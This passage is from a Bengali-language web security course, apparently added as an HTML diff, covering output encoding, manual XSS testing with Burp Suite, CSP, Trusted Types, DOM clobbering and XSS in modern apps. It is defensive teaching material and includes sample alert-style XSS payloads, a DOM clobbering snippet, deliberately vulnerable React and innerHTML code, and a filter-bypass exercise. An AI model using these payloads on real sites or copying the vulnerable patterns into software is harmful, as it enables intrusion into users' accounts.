+      <tr><td>JavaScript string</td><td>JS-নির্দিষ্ট escaping + কখনোই সরাসরি user input দিয়ে <code>&lt;script&gt;</code> ব্লক তৈরি না করা</td></tr>
+      <tr><td>URL</td><td>URL encoding + স্কিম allowlist (<code>http</code>/<code>https</code> শুধু, <code>javascript:</code> নিষিদ্ধ)</td></tr>
+      <tr><td>CSS</td><td>CSS encoding + ইউজার input থেকে সরাসরি style মান না বসানো</td></tr>
+      <tr><td>Rich HTML প্রয়োজন হলে</td><td>Allowlist-ভিত্তিক sanitizer (DOMPurify) — কখনো blocklist না</td></tr>
+    </tbody>
+  </table>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>একটি filter <code>&lt;script&gt;</code> ও <code>javascript:</code> স্ট্রিং case-insensitively বাদ দেয়, কিন্তু কোনো HTML entity এনকোডিং করে না। এই filter-এর বিরুদ্ধে HTML context-এ কোন ধরনের পেলোড এখনও কাজ করতে পারে? (ইঙ্গিত: অধ্যায় ৪-এর event-handler পেলোড দেখুন।)</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>Output encoding context-নির্দিষ্ট হতে হবে — একটি একক এনকোডিং পদ্ধতি সব জায়গায় কাজ করে না। Blocklist filtering সহজাতভাবে অসম্পূর্ণ, যেখানে allowlist-ভিত্তিক পদ্ধতি অনেক বেশি নির্ভরযোগ্য। Rich HTML-এর জন্য DOMPurify-এর মতো পরীক্ষিত লাইব্রেরি ব্যবহার করাই একমাত্র নিরাপদ পথ।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Input validation ও output encoding-এর মধ্যে পার্থক্য কী, এবং কেন দুটোই প্রয়োজন হতে পারে?</li>
+      <li>নেস্টেড ট্যাগ দিয়ে naive filter কীভাবে bypass হতে পারে, উদাহরণসহ ব্যাখ্যা করুন।</li>
+      <li>নিজের sanitizer লেখা কেন ঝুঁকিপূর্ণ?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter05"><span>পূর্ববর্তী</span>অধ্যায় ০৫</a>
+    <a class="next" href="/chapter07"><span>পরবর্তী</span>অধ্যায় ০৭ — Burp Suite দিয়ে টেস্টিং</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 7 — Manual Testing with Burp Suite
+========================================================= -->
+<section class="chapter" id="chapter07">
+  <div class="eyebrow">অধ্যায় ০৭ · টেস্টিং</div>
+  <h1>Manual Testing with Burp Suite</h1>
+  <p class="sub">Burp Suite ও Browser DevTools ব্যবহার করে বাস্তবসম্মত, পদ্ধতিগত XSS টেস্টিং ওয়ার্কফ্লো।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> Burp Suite দিয়ে শুধুমাত্র নিজের lab, অনুমোদিত training target বা স্পষ্ট scope-ভুক্ত bug bounty প্রোগ্রামে টেস্টিং করুন। Proxy ইন্টারসেপ্ট করে অন্য কারো ট্রাফিক দেখা/পরিবর্তন করা সম্পূর্ণভাবে নিষিদ্ধ।</p></div>
+
+  <h2>Burp Suite Proxy Setup</h2>
+  <p>Burp Suite একটি intercepting proxy — ব্রাউজার ও সার্ভারের মাঝে বসে প্রতিটি HTTP request/response দেখা, থামানো এবং পরিবর্তন করার সুযোগ দেয়।</p>
+  <ol>
+    <li>Burp Suite চালু করুন, Proxy ট্যাবে যান, নিশ্চিত করুন proxy listener <code>127.0.0.1:8080</code>-এ চলছে।</li>
+    <li>ব্রাউজারে (অথবা Burp-এর বিল্ট-ইন Chromium ব্রাউজারে) proxy সেট করুন যাতে সব ট্রাফিক Burp-এর মধ্য দিয়ে যায়।</li>
+    <li>Burp-এর CA সার্টিফিকেট ব্রাউজারে ইনস্টল করুন, যাতে HTTPS ট্রাফিকও ইন্টারসেপ্ট করা যায় (<code>http://burp</code> থেকে ডাউনলোড করা যায়)।</li>
+    <li>শুধুমাত্র নিজের lab/অনুমোদিত target-এর ডোমেইনে স্কোপ সীমাবদ্ধ রাখুন (Target → Scope)।</li>
+  </ol>
+
+  <h2>HTTP Request ও Response বিশ্লেষণ</h2>
+  <p>Proxy → HTTP history ট্যাবে প্রতিটি request/response দেখা যায় — headers, body, cookies সবকিছু বিস্তারিতভাবে। XSS টেস্টিংয়ের জন্য প্রতিটি সম্ভাব্য input point নোট করুন: URL parameter, form field, JSON body field, cookie value, এবং header (যেমন <code>User-Agent</code>, <code>Referer</code> — যদি এগুলো কোথাও log/display করা হয়)।</p>
+
+  <h2>Input Points শনাক্ত করা</h2>
+  <div class="codeblock"><div class="cb-head"><span>পদ্ধতিগত চেকলিস্ট</span></div><pre><code>□ URL path parameter        (/product/7)
+□ Query string parameter    (?id=7&amp;sort=name)
+□ Form POST body field
+□ JSON API body field
+□ Cookie value
+□ Custom HTTP header
+□ File upload metadata (ফাইলের নাম, EXIF ডেটা)
+□ WebSocket message (যদি থাকে)</code></pre></div>
+
+  <h2>Repeater দিয়ে Testing</h2>
+  <p><strong>Repeater</strong> হলো Burp-এর সবচেয়ে গুরুত্বপূর্ণ টুল ম্যানুয়াল XSS টেস্টিংয়ে — একটি request পাঠিয়ে, তার ফলাফল দেখে, request-টি সরাসরি edit করে আবার পাঠানো যায়, বারবার ব্রাউজারে ফিরে না গিয়ে।</p>
+  <ol>
+    <li>HTTP history-তে কোনো ইন্টারেস্টিং request-এ right-click করে "Send to Repeater" করুন।</li>
+    <li>Repeater ট্যাবে parameter-এর মান marker string দিয়ে পরিবর্তন করুন।</li>
+    <li>"Send" চাপুন এবং response প্যানেলে marker খুঁজুন (Ctrl+F)।</li>
+    <li>ধীরে ধীরে payload পরিবর্তন করে context ও filter আচরণ বুঝুন — প্রতিটি iteration সেকেন্ডের মধ্যে করা যায়।</li>
+  </ol>
+  <div class="codeblock"><div class="cb-head"><span>Repeater workflow উদাহরণ</span></div><pre><code>Request 1: GET /search?q=zzMARKERzz
+→ Response: &lt;p&gt;ফলাফল: zzMARKERzz&lt;/p&gt;   (raw reflection, কোনো encoding নেই)
+
+Request 2: GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+→ Response: &lt;p&gt;ফলাফল: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;
+
+→ Repeater-এর response প্যানেলে "Render" ট্যাব থেকে প্রকৃত execution
+  দৃশ্যত নিশ্চিত করা যায় (Burp-এর built-in browser render ব্যবহার করে)।</code></pre></div>
+
+  <h2>Reflection Analysis ও Encoding Comparison</h2>
+  <p>একই marker একাধিক parameter-এ, একাধিকবার, সামান্য ভিন্নতা নিয়ে (<code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code>, <code>&amp;</code> আলাদাভাবে) পাঠিয়ে Repeater-এ প্রতিটি response পাশাপাশি তুলনা করুন — কোন ক্যারেক্টার encode হচ্ছে আর কোনটি হচ্ছে না তার একটি স্পষ্ট ম্যাট্রিক্স তৈরি করুন।</p>
+
+  <h2>Browser DevTools</h2>
+  <p>Burp-এর পাশাপাশি ব্রাউজারের নিজস্ব DevTools (F12) অপরিহার্য:</p>
+  <ul>
+    <li><strong>Elements প্যানেল:</strong> rendered DOM দেখা, marker খুঁজে তার আশেপাশের structure পরীক্ষা করা।</li>
+    <li><strong>Console প্যানেল:</strong> CSP violation, JavaScript error, বা payload execute হলে তার কোনো side-effect দেখা।</li>
+    <li><strong>Sources প্যানেল:</strong> client-side JavaScript কোড পড়া, breakpoint বসানো (DOM-based XSS-এর জন্য অপরিহার্য)।</li>
+    <li><strong>Network প্যানেল:</strong> raw response headers/body দেখা, বিশেষ করে <code>Content-Type</code> ও <code>Content-Security-Policy</code> header যাচাই করা।</li>
+  </ul>
+
+  <h2>DOM Invader</h2>
+  <p><strong>DOM Invader</strong> হলো Burp Suite-এর বিল্ট-ইন ব্রাউজারের একটি এক্সটেনশন, যা DOM-based XSS শনাক্ত করার জন্য বিশেষভাবে ডিজাইন করা। এটি পেজের সব source (<code>location.hash</code>, <code>postMessage</code> ইত্যাদি) এবং sink (<code>innerHTML</code>, <code>eval</code> ইত্যাদি) স্বয়ংক্রিয়ভাবে instrument করে, এবং canary value পাঠিয়ে কোন source থেকে কোন sink পর্যন্ত ডেটা পৌঁছাচ্ছে তা হাইলাইট করে দেখায় — ম্যানুয়াল source-to-sink tracing (অধ্যায় ৫)-এর কাজ অনেক দ্রুত করে দেয়।</p>
+  <div class="callout info"><div class="ic">💡</div><p>DOM Invader ব্যবহার করতে Burp-এর বিল্ট-ইন Chromium ব্রাউজার থেকে টার্গেট ভিজিট করুন, Burp-এর Settings → DOM Invader থেকে এটি enable করুন, তারপর পেজের সাথে স্বাভাবিকভাবে interact করুন — এটি background-এ source/sink ট্র্যাক করতে থাকবে।</p></div>
+
+  <h2>Stored XSS-এর Lifecycle Testing</h2>
+  <p>Stored XSS টেস্ট করার সময় সাধারণ reflected ওয়ার্কফ্লো যথেষ্ট না, কারণ payload জমা দেওয়া ও তার effect দেখা — এই দুই ধাপ আলাদা request-এ ঘটে:</p>
+  <ol>
+    <li>একটি unique marker-সহ (যেমন <code>zzSTOREDtest01zz</code>) payload জমা দিন (Repeater বা স্বাভাবিক ব্রাউজার ব্যবহার করে)।</li>
+    <li>সেই ডেটা যে পেজে প্রদর্শিত হওয়ার কথা, সেটি একটি নতুন request দিয়ে লোড করুন (Repeater-এ আলাদা ট্যাবে)।</li>
+    <li>Marker খুঁজুন এবং তার context/encoding বিশ্লেষণ করুন।</li>
+    <li>বিভিন্ন ভিউ (নিজের অ্যাকাউন্ট, অন্য টেস্ট অ্যাকাউন্ট, admin ভিউ যদি lab-এ উপলব্ধ থাকে) থেকে যাচাই করুন ডেটা কীভাবে ভিন্নভাবে প্রদর্শিত হয়।</li>
+  </ol>
+
+  <h2>নিরাপদ Blind XSS Lab Setup</h2>
+  <p>নিজের lab-এ Blind XSS অনুশীলনের জন্য একটি সাধারণ সেটআপ: একটি ছোট HTTP server (যেমন <code>python3 -m http.server</code> বা একটি webhook.site-এর মতো সার্ভিসের নিজস্ব instance) চালিয়ে একটি "collector" তৈরি করুন, এবং শুধুমাত্র নিজের তৈরি lab অ্যাপ্লিকেশনে সেই collector-এর URL সহ পেলোড জমা দিন। লক্ষ্য রাখুন collector log শুধুমাত্র আপনার নিজের নিয়ন্ত্রণে থাকে।</p>
+
+  <h2>False Positive যাচাইকরণ</h2>
+  <table>
+    <thead><tr><th>সম্ভাব্য False Positive</th><th>কীভাবে নিশ্চিত হবেন</th></tr></thead>
+    <tbody>
+      <tr><td>Marker response-এ দেখা যাচ্ছে কিন্তু encode অবস্থায়</td><td>Raw response-এ <code>&amp;lt;</code>/<code>&amp;gt;</code> দেখা গেলে তা execute হবে না — vulnerability নয়</td></tr>
+      <tr><td>Payload response-এ আছে, alert আসছে না</td><td>Console-এ CSP error বা syntax error আছে কি না দেখুন; context ভুল ধরা হয়েছে কি না যাচাই করুন</td></tr>
+      <tr><td>শুধু reflected দেখা যাচ্ছে, কিন্তু আসলে iframe sandbox/isolated origin-এ রেন্ডার হচ্ছে</td><td>Response-এর <code>Content-Type</code> ও <code>X-Content-Type-Options</code> header যাচাই করুন — যদি <code>text/plain</code> হিসেবে পরিবেশিত হয়, ব্রাউজার HTML হিসেবে parse করবে না</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Evidence Collection</h2>
+  <p>একটি finding রিপোর্ট করার আগে নিম্নলিখিত প্রমাণ সংগ্রহ করা উচিত (অধ্যায় ১২-এ বিস্তারিত):</p>
+  <ul>
+    <li>সম্পূর্ণ request (Repeater থেকে, headers-সহ) যা vulnerability trigger করে।</li>
+    <li>সম্পূর্ণ response (বিশেষ করে marker-এর আশেপাশের অংশ)।</li>
+    <li>একটি harmless proof-of-execution screenshot (যেমন <code>alert(document.domain)</code>-এর ডায়ালগ বক্স)।</li>
+    <li>Context ও root cause-এর সংক্ষিপ্ত বিশ্লেষণ।</li>
+  </ul>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>Burp Repeater-এ একটি request পাঠানোর পর response-এ আপনার marker দেখা যাচ্ছে না। পরবর্তী তিনটি ডায়াগনস্টিক ধাপ কী কী হতে পারে?</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>Burp Suite Repeater দিয়ে দ্রুত, পুনরাবৃত্তিমূলক ম্যানুয়াল টেস্টিং সম্ভব; DOM Invader DOM-based XSS শনাক্তকরণ ত্বরান্বিত করে। Browser DevTools-এর সাথে মিলিয়ে ব্যবহার করলে source-to-sink tracing, encoding বিশ্লেষণ ও evidence collection অনেক বেশি নির্ভুল হয়।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Repeater কীভাবে ম্যানুয়াল XSS টেস্টিংকে দ্রুততর করে?</li>
+      <li>DOM Invader কোন নির্দিষ্ট সমস্যার সমাধান করে?</li>
+      <li>Stored XSS টেস্ট করার সময় কেন দুটি আলাদা request লাগে?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter06"><span>পূর্ববর্তী</span>অধ্যায় ০৬</a>
+    <a class="next" href="/chapter08"><span>পরবর্তী</span>অধ্যায় ০৮ — অ্যাডভান্সড XSS রিসার্চ</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 8 — Advanced XSS Research
+========================================================= -->
+<section class="chapter" id="chapter08">
+  <div class="eyebrow">অধ্যায় ০৮ · অ্যাডভান্সড</div>
+  <h1>Advanced XSS Research</h1>
+  <p class="sub">Nested parsing contexts, modern framework নিরাপত্তা, CSP, Trusted Types ও root-cause বিশ্লেষণ।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ের advanced টেকনিক শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে প্রয়োগ করুন।</p></div>
+
+  <h2>Nested Parsing Contexts</h2>
+  <p>আধুনিক ওয়েব অ্যাপে প্রায়ই একাধিক স্তরের template/rendering engine একসাথে কাজ করে — যেমন সার্ভার-সাইড templating (Jinja2, EJS) দিয়ে তৈরি HTML-এর ভেতরে client-side JavaScript টেমপ্লেট (Vue/Angular-এর মতো) বসানো। এই ক্ষেত্রে input একাধিক parsing স্তর অতিক্রম করে, এবং প্রতিটি স্তরের নিজস্ব escaping নিয়ম থাকে — একটি স্তরে নিরাপদ মনে হওয়া ডেটা পরের স্তরে বিপজ্জনক হয়ে উঠতে পারে।</p>
+
+  <h2>Modern Framework Security</h2>
+  <p>React, Angular, Vue-এর মতো আধুনিক ফ্রেমওয়ার্ক ডিফল্টভাবে output auto-escape করে — যা traditional reflected/stored XSS অনেকটাই কমিয়ে দিয়েছে। কিন্তু প্রতিটি ফ্রেমওয়ার্কেই "escape hatch" API আছে, যা ডেভেলপারকে ইচ্ছাকৃতভাবে raw HTML বসানোর সুযোগ দেয় — এবং এগুলোই আধুনিক XSS-এর প্রধান উৎস।</p>
+  <table>
+    <thead><tr><th>Framework</th><th>Unsafe API</th><th>নিরাপদ বিকল্প</th></tr></thead>
+    <tbody>
+      <tr><td>React</td><td><code>dangerouslySetInnerHTML</code></td><td>JSX-এ সরাসরি variable interpolate করা (ডিফল্টভাবে auto-escaped)</td></tr>
+      <tr><td>Angular</td><td><code>[innerHTML]</code> বাইন্ডিং + <code>bypassSecurityTrustHtml()</code></td><td>Interpolation (<code>{{ value }}</code>), যা ডিফল্টভাবে sanitize হয়</td></tr>
+      <tr><td>Vue</td><td><code>v-html</code> directive</td><td>টেক্সট interpolation (<code>{{ value }}</code>)</td></tr>
+    </tbody>
+  </table>
+  <div class="codeblock"><div class="cb-head"><span>React — ভুল বনাম সঠিক</span><button class="copy-btn">কপি</button></div><pre><code>// ❌ Unsafe
+function Comment({text}) {
+  return &lt;div dangerouslySetInnerHTML={{__html: text}} /&gt;;
+}
+
+// ✅ Safe (auto-escaped by JSX)
+function Comment({text}) {
+  return &lt;div&gt;{text}&lt;/div&gt;;
+}</code></pre></div>
+  <p><strong>গুরুত্বপূর্ণ সতর্কতা:</strong> "আমরা React/Vue ব্যবহার করি, তাই আমরা XSS থেকে নিরাপদ" — এটি একটি বিপজ্জনক ভুল ধারণা। যেকোনো জায়গায় একজন ডেভেলপার যদি সুবিধার জন্য escape hatch ব্যবহার করেন (প্রায়ই rich-text/markdown রেন্ডার করার জন্য), vulnerability ফিরে আসে।</p>
+
+  <h2>Content Security Policy (CSP)</h2>
+  <p><strong>CSP</strong> একটি HTTP response header (<code>Content-Security-Policy</code>), যা ব্রাউজারকে নির্দেশ দেয় কোন কোন উৎস থেকে script/style/image লোড করা অনুমোদিত। সঠিকভাবে কনফিগার করা CSP অনেক XSS payload-কে execute হতে বাধা দেয়, এমনকি HTML injection ঘটলেও।</p>
+  <div class="codeblock"><div class="cb-head"><span>CSP উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example; object-src 'none'
+
+→ এই নীতিতে: inline &lt;script&gt;alert(1)&lt;/script&gt; execute হবে না
+  (কারণ 'unsafe-inline' নেই), এবং শুধুমাত্র নিজের origin ও
+  trusted-cdn.example থেকে external script লোড হবে।</code></pre></div>
+  <h3>CSP-এর সাধারণ দুর্বলতা</h3>
+  <ul>
+    <li><strong><code>unsafe-inline</code> থাকা:</strong> এটি থাকলে inline script-এর বিরুদ্ধে CSP-এর প্রধান সুরক্ষাই অকার্যকর হয়ে যায়।</li>
+    <li><strong>Overly broad script-src:</strong> যেমন <code>script-src *</code> বা একটি বিশ্বস্ত কিন্তু ব্যবহারকারী-আপলোডযোগ্য কনটেন্ট হোস্ট করা CDN allowlist-এ থাকা (JSONP endpoint-এর মাধ্যমে bypass সম্ভব হতে পারে)।</li>
+    <li><strong>Nonce/hash পুনঃব্যবহার:</strong> যদি একটি nonce static/predictable হয়, attacker সেটি অনুমান/পুনঃব্যবহার করতে পারে।</li>
+  </ul>
+  <p>CSP কখনো একমাত্র প্রতিরক্ষা হিসেবে বিবেচনা করা উচিত না — এটি <strong>defense-in-depth</strong>-এর একটি স্তর, output encoding-এর বিকল্প নয়।</p>
+
+  <h2>Trusted Types</h2>
+  <p><strong>Trusted Types</strong> একটি ব্রাউজার API (CSP-এর মাধ্যমে enable করা হয়), যা DOM XSS sink-গুলোকে (<code>innerHTML</code>, <code>eval</code> ইত্যাদি) raw string গ্রহণ করতে বাধা দেয় — শুধুমাত্র একটি নির্দিষ্ট, developer-নির্ধারিত "policy" দিয়ে তৈরি করা বিশেষ অবজেক্টই গ্রহণযোগ্য হয়। এটি মূলত DOM-based XSS-এর বিরুদ্ধে একটি architectural defense, যা sanitization ভুলে যাওয়ার মানবিক ভুল কমিয়ে দেয়।</p>
+  <div class="codeblock"><div class="cb-head"><span>Trusted Types উদাহরণ (ধারণাগত)</span><button class="copy-btn">কপি</button></div><pre><code>Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy;
+
+const policy = trustedTypes.createPolicy('myPolicy', {
+  createHTML: (input) =&gt; DOMPurify.sanitize(input)
+});
+element.innerHTML = policy.createHTML(userInput); // অনুমোদিত
+element.innerHTML = userInput; // ব্রাউজার ব্লক করবে — raw string গ্রহণযোগ্য না</code></pre></div>
+
+  <h2>Mutation XSS — পুনরালোচনা</h2>
+  <p>অধ্যায় ৩-এ mXSS-এর মৌলিক ধারণা দেখা হয়েছে। Advanced পর্যায়ে এর গবেষণা মূলত sanitizer-এর parse/serialize round-trip-এর সূক্ষ্ম আচরণ নিয়ে — যেমন নির্দিষ্ট namespace (SVG/MathML)-এর ভেতরে HTML ট্যাগ কীভাবে আচরণ করে তা বিভিন্ন ব্রাউজার ইঞ্জিনে আলাদা হতে পারে। Real-world mXSS গবেষণা সাধারণত browser engine source code ও sanitizer-এর টেস্ট স্যুট গভীরভাবে অধ্যয়ন করে করা হয় — এটি একটি উচ্চ-দক্ষতাসম্পন্ন, সময়সাপেক্ষ গবেষণা ক্ষেত্র।</p>
+
+  <h2>DOM Clobbering</h2>
+  <p><strong>DOM clobbering</strong> একটি কৌশল যেখানে attacker নির্দিষ্ট <code>id</code>/<code>name</code> attribute-সহ HTML element তৈরি করে, যা JavaScript কোডের প্রত্যাশিত global variable বা object property-কে "ওভাররাইড" করে দেয় — বিশেষ করে যখন কোড অনুমান করে একটি নির্দিষ্ট ভ্যারিয়েবল সবসময় একটি নির্দিষ্ট টাইপের (যেমন ফাংশন বা কনফিগারেশন অবজেক্ট) হবে।</p>
+  <div class="codeblock"><div class="cb-head"><span>ধারণাগত উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>// Vulnerable JS (অনুমান করে config সবসময় object):
+if (window.config &amp;&amp; window.config.isAdmin) { ... }
+
+// Attacker-controlled HTML (যদি attacker সীমিত HTML injection করতে পারেন,
+// কিন্তু &lt;script&gt; সরাসরি চালাতে না পারেন):
+&lt;form id="config"&gt;&lt;input name="isAdmin" value="true"&gt;&lt;/form&gt;
+
+// এখন window.config একটি HTMLFormElement হয়ে যায়, এবং
+// window.config.isAdmin সেই input-এর মান নির্দেশ করে — যা
+// মূল কোডের লজিককে বিভ্রান্ত করতে পারে।</code></pre></div>
+  <p>এটি দেখায় যে এমনকি সীমিত HTML injection (যেখানে সরাসরি script execution সম্ভব না) ও বিপজ্জনক হতে পারে, যদি client-side কোড global namespace-এর উপর ভুলভাবে নির্ভর করে।</p>
+
+  <h2>Browser Compatibility ও Sanitizer Differences</h2>
+  <p>Research-grade XSS কাজে এটি মনে রাখা জরুরি যে একই payload সব ব্রাউজারে একইভাবে আচরণ নাও করতে পারে — বিশেষ করে পুরনো vs. নতুন ব্রাউজার ইঞ্জিন, অথবা বিভিন্ন sanitizer লাইব্রেরি/সংস্করণ। একটি responsible disclosure/bug bounty report-এ কোন ব্রাউজার ও সংস্করণে টেস্ট করা হয়েছে তা স্পষ্টভাবে উল্লেখ করা উচিত (অধ্যায় ১২)।</p>
+
+  <h2>Root-Cause Analysis Framework</h2>
+  <p>একটি advanced XSS finding-এর জন্য শুধু "এটি কাজ করে" বলা যথেষ্ট না — root cause বিশ্লেষণে অন্তর্ভুক্ত থাকা উচিত:</p>
+  <ol>
+    <li><strong>Data flow:</strong> ঠিক কোন source থেকে ডেটা এসেছে এবং কোন sink পর্যন্ত পৌঁছেছে।</li>
+    <li><strong>Missing control:</strong> কোন নির্দিষ্ট স্তরে encoding/sanitization অনুপস্থিত বা ভুলভাবে প্রয়োগ করা হয়েছে।</li>
+    <li><strong>Contributing factors:</strong> framework misuse, CSP misconfiguration, বা parser differences কি ভূমিকা রেখেছে।</li>
+    <li><strong>নির্দিষ্ট, কার্যকর fix প্রস্তাব</strong> — শুধু "input sanitize করুন" না বলে, ঠিক কোন স্তরে কোন পরিবর্তন প্রয়োজন তা স্পষ্টভাবে বলা।</li>
+  </ol>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>একটি অ্যাপ্লিকেশনে React ব্যবহার হচ্ছে, কিন্তু একটি markdown-রেন্ডারিং কম্পোনেন্ট <code>dangerouslySetInnerHTML</code> দিয়ে markdown-কে HTML-এ রূপান্তরিত করে দেখাচ্ছে, কোনো sanitization ছাড়াই। এই পরিস্থিতির জন্য root-cause analysis framework অনুসরণ করে একটি সংক্ষিপ্ত বিশ্লেষণ লিখুন।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>আধুনিক ফ্রেমওয়ার্ক ডিফল্ট auto-escaping দিয়ে অনেক XSS প্রতিরোধ করে, কিন্তু escape hatch API-গুলোই আধুনিক XSS-এর প্রধান উৎস। CSP ও Trusted Types defense-in-depth স্তর হিসেবে শক্তিশালী, কিন্তু output encoding-এর বিকল্প নয়। DOM clobbering ও mutation XSS দেখায় যে সীমিত HTML injection-ও বিপজ্জনক হতে পারে।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>"আমরা React ব্যবহার করি তাই নিরাপদ" — এই ধারণার সমস্যা কী?</li>
+      <li>CSP-এর <code>unsafe-inline</code> কেন এর সুরক্ষা অনেকটাই নিষ্ক্রিয় করে দেয়?</li>
+      <li>DOM clobbering কীভাবে script execution ছাড়াই ক্ষতিকর হতে পারে?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter07"><span>পূর্ববর্তী</span>অধ্যায় ০৭</a>
+    <a class="next" href="/chapter09"><span>পরবর্তী</span>অধ্যায় ০৯ — আধুনিক ওয়েব অ্যাপে XSS</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 9 — XSS in Modern Web Applications
+========================================================= -->
+<section class="chapter" id="chapter09">
+  <div class="eyebrow">অধ্যায় ০৯ · প্রয়োগ</div>
+  <h1>XSS in Modern Web Applications</h1>
+  <p class="sub">SPA, REST API, rich-text editor, admin dashboard — বিভিন্ন আধুনিক আর্কিটেকচারে XSS কোথায় ও কীভাবে লুকিয়ে থাকে।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ের উদাহরণ শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে প্রয়োগ করুন।</p></div>
+
+  <h2>Single-Page Applications (SPA)</h2>
+  <p>SPA-তে পুরো অ্যাপ্লিকেশন একটিমাত্র HTML পেজ লোড করে, এবং বাকি সব navigation/rendering client-side JavaScript দিয়ে হয়। এর ফলে প্রায় সব data rendering DOM-based context-এ ঘটে — অর্থাৎ অধ্যায় ৩-এর DOM-based XSS প্যাটার্ন SPA-তে সবচেয়ে বেশি প্রাসঙ্গিক। Client-side router (যেমন URL hash বা History API দিয়ে route নির্ধারণ) নিজেই একটি সাধারণ source, যদি route parameter সরাসরি কোনো sink-এ ব্যবহৃত হয়।</p>
+
+  <h2>REST API ও JSON Rendering</h2>
+  <p>আধুনিক অ্যাপ প্রায়ই backend থেকে JSON ডেটা নিয়ে client-side-এ render করে। একটি সাধারণ ভুল ধারণা — "JSON নিরাপদ কারণ এটি HTML না"। কিন্তু JSON-এর ভেতরের স্ট্রিং মান, client-side কোডে কীভাবে ব্যবহৃত হচ্ছে তার উপর নির্ভর করে ঠিক ততটাই বিপজ্জনক হতে পারে, যদি সেই মান পরে <code>innerHTML</code>-এ বসানো হয়।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>// API response:
+{"username": "&lt;img src=x onerror=alert(1)&gt;"}
+
+// Client-side কোড (vulnerable):
+fetch('/api/profile').then(r =&gt; r.json()).then(data =&gt; {
+  document.getElementById('name').innerHTML = data.username; // ❌
+});</code></pre></div>
+
+  <h2>Search Result Rendering</h2>
+  <p>সার্চ ফিচারে প্রায়ই ইউজারের সার্চ টার্ম "হাইলাইট" করার জন্য প্রোগ্রামেটিকভাবে HTML তৈরি করা হয় (যেমন matched অংশ <code>&lt;mark&gt;</code> ট্যাগে মোড়ানো)। যদি এই হাইলাইটিং লজিক সরাসরি string concatenation/<code>innerHTML</code> ব্যবহার করে, এবং সার্চ টার্মে নিজে HTML থাকে, একটি দ্বিতীয় স্তরের injection ঘটতে পারে।</p>
+
+  <h2>প্রোফাইল, কমেন্ট ও রিভিউ</h2>
+  <p>এই ক্লাসিক stored XSS vector গুলো এখনও সমানভাবে প্রাসঙ্গিক — বিশেষ করে যখন bio/display name-এর মতো ফিল্ড একাধিক জায়গায় (প্রোফাইল পেজ, কমেন্ট লিস্ট, নোটিফিকেশন, অ্যাডমিন ইউজার-লিস্ট) আলাদা আলাদা কোড দিয়ে রেন্ডার হয় — প্রতিটি জায়গার encoding আলাদাভাবে যাচাই করা প্রয়োজন, কারণ একটি জায়গায় ফিক্স থাকলেও অন্য জায়গায় না-ও থাকতে পারে।</p>
+
+  <h2>Messaging Applications</h2>
+  <p>রিয়েল-টাইম মেসেজিং অ্যাপ (WebSocket-ভিত্তিক) প্রায়ই দ্রুত development-এর কারণে output encoding মিস করে। এছাড়া, message preview/notification (যেমন ব্রাউজার পুশ নোটিফিকেশন বা অন্য একটি UI কম্পোনেন্ট যা মেসেজ কনটেন্ট দেখায়) আলাদাভাবে রেন্ডার হতে পারে, এবং সেই দ্বিতীয় রেন্ডারিং পাথ প্রায়ই মূল চ্যাট উইন্ডোর মতো যত্ন সহকারে sanitize করা হয় না।</p>
+
+  <h2>Markdown ও Rich-Text Editor</h2>
+  <p>Markdown-কে HTML-এ রূপান্তর করা একটি ক্লাসিক উচ্চ-ঝুঁকিপূর্ণ এলাকা — কারণ markdown নিজে HTML tag পাস-থ্রু করার অনুমতি দেয়, এবং markdown parser প্রায়ই রূপান্তরের পর নিজে sanitize করে না। নিয়ম: markdown parser-এর আউটপুটকে সবসময় raw, untrusted HTML হিসেবে বিবেচনা করুন এবং পরে আলাদাভাবে DOMPurify দিয়ে sanitize করুন।</p>
+
+  <h2>File Metadata</h2>
+  <p>File upload ফিচারে ফাইলের নাম, EXIF ডেটা (ছবির মেটাডেটা), বা SVG ফাইলের ভেতরের কনটেন্ট (SVG নিজেই একটি XML/HTML-সদৃশ ফরম্যাট, যার ভেতরে <code>&lt;script&gt;</code> থাকতে পারে) প্রায়ই একটি ভুলে যাওয়া XSS vector। একটি আপলোড করা SVG ফাইল সরাসরি <code>&lt;img&gt;</code> ট্যাগে না দেখিয়ে browser-এ সরাসরি খোলার লিঙ্ক দিলে, SVG-এর ভেতরের script execute হতে পারে।</p>
+
+  <h2>Admin Dashboard</h2>
